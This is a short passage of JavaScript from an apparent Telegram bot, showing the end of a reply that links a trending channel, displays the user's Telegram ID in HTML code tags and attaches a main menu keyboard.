    `📊 Trending channel: https://t.me/pumpmints\n\n` +
    `Your User ID: <code>${ctx.from.id}</code>`,
    { parse_mode: "HTML", ...mainMenuKeyboard }
  );
}
